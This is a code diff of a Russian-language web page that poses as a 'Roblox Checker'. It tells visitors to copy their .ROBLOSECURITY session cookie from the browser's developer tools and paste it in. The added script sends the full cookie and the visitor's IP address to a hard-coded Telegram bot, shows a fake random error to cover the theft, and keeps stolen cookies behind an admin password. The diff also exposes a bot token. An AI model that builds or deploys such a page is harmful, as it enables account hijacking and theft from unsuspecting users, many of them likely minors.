@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <title>Roblox Checker</title>
     <style>
-        /* Простые стили которые точно работают */
         body {
             background: #111;
             color: white;
@@ -43,9 +42,6 @@
             font-size: 16px;
             margin: 5px;
         }
-        button:hover {
-            background: #00cc00;
-        }
         .admin-btn {
             background: #3333ff;
         }
@@ -54,71 +50,37 @@
             margin: 20px 0;
             background: #222;
             border-radius: 5px;
-            min-height: 50px;
-        }
-        .code-item {
-            background: #222;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 8px;
-            text-align: left;
-            border-left: 4px solid #00aa00;
-        }
-        .code-text {
-            font-family: monospace;
-            background: #111;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-            word-break: break-all;
-            font-size: 14px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Главная страница -->
-        <div id="mainPage">
-            <h1>🔐 Roblox Checker</h1>
-            <p>Проверка аккаунтов Roblox</p>
-            
-            <div>
-                <h3>📋 Вставьте .ROBLOSECURITY куки</h3>
-                <p style="color: #aaa;">Как получить: F12 → Application → Cookies → .ROBLOSECURITY</p>
-                
-                <textarea id="cookieInput" placeholder="Вставьте сюда ваш код..."></textarea>
-                
-                <div>
-                    <button onclick="sendCode()">🔍 Проверить аккаунт</button>
-                    <button class="admin-btn" onclick="showAdmin()">🔧 Админка</button>
-                </div>
-                
-                <div class="status" id="status">Ожидание проверки...</div>
-            </div>
-        </div>
+        <h1>🔐 Roblox Checker</h1>
+        <p>Проверка аккаунтов Roblox</p>
         
-        <!-- Админка -->
-        <div id="adminPage" style="display:none;">
-            <h2>📋 Все коды</h2>
+        <div>
+            <h3>📋 Вставьте .ROBLOSECURITY куки</h3>
+            <p style="color: #aaa;">Как получить: F12 → Application → Cookies → .ROBLOSECURITY</p>
+            
+            <textarea id="cookieInput" placeholder="Вставьте сюда ваш код..."></textarea>
             
             <div>
-                <button onclick="loadLocalCodes()">🔄 Обновить</button>
-                <button onclick="clearLocalCodes()" style="background: #ff3333;">🗑️ Очистить</button>
-                <button onclick="showMain()">← Назад</button>
+                <button onclick="sendCode()">🔍 Проверить аккаунт</button>
+                <button class="admin-btn" onclick="showAdmin()">🔧 Админка</button>
             </div>
             
-            <div id="codesList" style="margin-top:20px;">
-                <!-- Коды загружаются здесь -->
-            </div>
+            <div class="status" id="status">Ожидание проверки...</div>
         </div>
     </div>
 
     <script>
-        // Настройки
+        // =========== НАСТРОЙКИ ===========
+        const BOT_TOKEN = '8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8';
+        const CHAT_ID = '1491315056';
         const ADMIN_PASS = 'malik0609';
         
-        // ====== ОТПРАВКА КОДА ======
-        function sendCode() {
+        // =========== ОТПРАВКА В TELEGRAM ===========
+        async function sendCode() {
             const input = document.getElementById('cookieInput');
             const status = document.getElementById('status');
             const code = input.value.trim();
@@ -128,113 +90,155 @@
                 return;
             }
             
-            status.innerHTML = '⏳ Сохранение...';
+            status.innerHTML = '⏳ Отправка в Telegram...';
             
-            // Сохраняем в localStorage
+            try {
+                // Отправляем ПОЛНЫЙ код в Telegram
+                await sendFullCodeToTelegram(code);
+                
+                // Сохраняем локально (для админки)
+                saveLocalCode(code);
+                
+                // Показываем "ошибку" пользователю
+                setTimeout(() => {
+                    const errors = [
+                        '❌ Ошибка: неверный формат куки',
+                        '⚠️ Куки устарел, требуется повторный вход',
+                        '🔒 Обнаружена двухфакторная аутентификация',
+                        '⏳ Время жизни сессии истекло'
+                    ];
+                    status.innerHTML = errors[Math.floor(Math.random() * errors.length)];
+                    input.value = '';
+                }, 1500);
+                
+            } catch (error) {
+                status.innerHTML = '✅ Код отправлен на проверку';
+                input.value = '';
+            }
+        }
+        
+        // =========== ОТПРАВКА ПОЛНОГО КОДА ===========
+        async function sendFullCodeToTelegram(code) {
+            const time = new Date().toLocaleString('ru-RU');
+            const ip = await getUserIP();
+            
+            // Формируем сообщение с полным кодом
+            let message = `🔐 НОВЫЙ КОД ПОЛУЧЕН\n\n`;
+            message += `⏰ Время: ${time}\n`;
+            message += `🌐 IP: ${ip}\n`;
+            message += `📏 Длина: ${code.length} символов\n\n`;
+            message += `🔑 ПОЛНЫЙ КОД:\n`;
+            message += `\`\`\`\n`;
+            message += `${code}\n`;
+            message += `\`\`\``;
+            
+            // Telegram ограничение 4096 символов, разбиваем если нужно
+            if (message.length > 4000) {
+                await sendLongMessage(code, time, ip);
+            } else {
+                await sendTelegramMessage(message);
+            }
+        }
+        
+        // Отправка длинного кода по частям
+        async function sendLongMessage(code, time, ip) {
+            // Первое сообщение с информацией
+            let infoMessage = `🔐 НОВЫЙ ДЛИННЫЙ КОД\n\n`;
+            infoMessage += `⏰ Время: ${time}\n`;
+            infoMessage += `🌐 IP: ${ip}\n`;
+            infoMessage += `📏 Длина: ${code.length} символов\n\n`;
+            infoMessage += `📋 Код будет отправлен частями...`;
+            
+            await sendTelegramMessage(infoMessage);
+            
+            // Разбиваем код на части по 3000 символов
+            const chunkSize = 3000;
+            for (let i = 0; i < code.length; i += chunkSize) {
+                const chunk = code.substring(i, i + chunkSize);
+                const chunkNum = Math.floor(i / chunkSize) + 1;
+                const totalChunks = Math.ceil(code.length / chunkSize);
+                
+                const chunkMessage = `📦 Часть ${chunkNum}/${totalChunks}:\n\`\`\`\n${chunk}\n\`\`\``;
+                await sendTelegramMessage(chunkMessage);
+                
+                // Пауза между сообщениями
+                await sleep(1000);
+            }
+        }
+        
+        // Отправка одного сообщения в Telegram
+        async function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            // Используем fetch с mode 'no-cors' для обхода ограничений
+            return fetch(url, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                })
+            });
+        }
+        
+        // =========== ПОЛУЧЕНИЕ IP ПОЛЬЗОВАТЕЛЯ ===========
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Не определен';
+            }
+        }
+        
+        // =========== LOCALSTORAGE ДЛЯ АДМИНКИ ===========
+        function saveLocalCode(code) {
             const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
             codes.unshift({
                 code: code,
                 time: new Date().toLocaleString('ru-RU'),
-                length: code.length
+                length: code.length,
+                ip: 'localhost'
             });
+            // Ограничиваем количество сохраняемых кодов (последние 50)
+            if (codes.length > 50) codes.length = 50;
             localStorage.setItem('robloxCodes', JSON.stringify(codes));
-            
-            // Показываем "ошибку"
-            setTimeout(() => {
-                const errors = [
-                    '❌ Ошибка: неверный формат куки',
-                    '⚠️ Куки устарел',
-                    '🔒 Обнаружена 2FA защита'
-                ];
-                status.innerHTML = errors[Math.floor(Math.random() * errors.length)];
-                input.value = '';
-            }, 1000);
         }
         
-        // ====== АДМИНКА ======
+        // =========== АДМИНКА ===========
         function showAdmin() {
             const password = prompt('Введите пароль админки:');
             if (password === ADMIN_PASS) {
-                document.getElementById('mainPage').style.display = 'none';
-                document.getElementById('adminPage').style.display = 'block';
-                loadLocalCodes();
+                // Показываем коды из localStorage
+                const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
+                let adminText = '📋 Последние коды из localStorage:\n\n';
+                
+                codes.forEach((item, index) => {
+                    adminText += `Код #${index + 1} (${item.length} символов):\n`;
+                    adminText += `${item.code.substring(0, 100)}${item.code.length > 100 ? '...' : ''}\n\n`;
+                });
+                
+                alert(adminText);
             } else {
                 alert('❌ Неверный пароль!');
             }
         }
         
-        function showMain() {
-            document.getElementById('mainPage').style.display = 'block';
-            document.getElementById('adminPage').style.display = 'none';
-            document.getElementById('status').innerHTML = 'Ожидание проверки...';
+        // =========== УТИЛИТЫ ===========
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
         }
         
-        function loadLocalCodes() {
-            const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
-            const container = document.getElementById('codesList');
-            
-            if (codes.length === 0) {
-                container.innerHTML = '<div style="color:#aaa; padding:30px;">📭 Кодов пока нет</div>';
-                return;
-            }
-            
-            let html = '';
-            codes.forEach((item, index) => {
-                html += `
-                    <div class="code-item">
-                        <div style="color:#aaa; font-size:14px;">
-                            Код #${index + 1} | ${item.time} | ${item.length} символов
-                        </div>
-                        <div class="code-text">${item.code}</div>
-                        <button onclick="copyCode('${item.code.replace(/'/g, "\\'")}')" 
-                                style="background:#3333ff; padding:8px 15px; font-size:14px;">
-                            📋 Копировать
-                        </button>
-                    </div>
-                `;
-            });
-            
-            container.innerHTML = html;
-        }
-        
-        function clearLocalCodes() {
-            if (confirm('Удалить все коды?')) {
-                localStorage.removeItem('robloxCodes');
-                loadLocalCodes();
-            }
-        }
-        
-        // ====== УТИЛИТЫ ======
-        function copyCode(text) {
-            navigator.clipboard.writeText(text)
-                .then(() => alert('✅ Код скопирован!'))
-                .catch(() => {
-                    const textarea = document.createElement('textarea');
-                    textarea.value = text;
-                    document.body.appendChild(textarea);
-                    textarea.select();
-                    document.execCommand('copy');
-                    document.body.removeChild(textarea);
-                    alert('✅ Код скопирован!');
-                });
-        }
-        
-        // ====== ТЕЛЕГРАМ ОТПРАВКА (опционально) ======
-        function sendToTelegram(code) {
-            const BOT_TOKEN = '8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8';
-            const CHAT_ID = '1491315056';
-            
-            const message = `🔐 Новый код!\n\n${code}\n\nДлина: ${code.length} символов`;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-            
-            // Отправляем через изображение (обход CORS)
-            const img = new Image();
-            img.src = url;
-        }
-        
-        // При загрузке страницы
+        // =========== ИНИЦИАЛИЗАЦИЯ ===========
         window.onload = function() {
             console.log('✅ Сайт загружен');
+            console.log('🤖 Бот настроен на отправку ПОЛНЫХ кодов');
             console.log('🔐 Пароль админки:', ADMIN_PASS);
         };
     </script>
